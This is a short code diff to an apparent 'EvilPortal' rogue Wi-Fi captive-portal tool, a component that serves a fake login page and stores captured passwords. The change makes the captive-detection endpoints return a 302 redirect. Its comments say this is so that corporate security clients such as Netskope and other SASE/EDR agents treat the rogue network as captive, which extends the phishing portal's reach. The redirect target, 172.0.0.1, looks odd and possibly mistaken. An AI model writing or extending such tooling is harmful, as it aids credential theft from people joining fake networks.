@@ -64,6 +64,7 @@ String EvilPortal::get_password() {
   return this->password;
 }
 
+// Add Support for broader Captive Portal technologies
 void EvilPortal::setupServer() {
   #ifndef HAS_PSRAM
     server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -94,17 +95,13 @@ void EvilPortal::setupServer() {
     "/redirect"
   };
 
+  // Return 302 instead of 200 so status-code-based captive portal detectors
+  // (Netskope client, most SASE/EDR agents) correctly classify this network
+  // as captive. Windows NCSI's body-check already worked; this fixes the rest.
   for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
-    
-    #ifndef HAS_PSRAM
-      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
-        request->send_P(200, "text/html", index_html);
-      });
-    #else
-      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
-        request->send(200, "text/html", index_html);
-      });
-    #endif
+    server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
+      request->redirect("http://172.0.0.1/");
+    });
   }
 
   server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
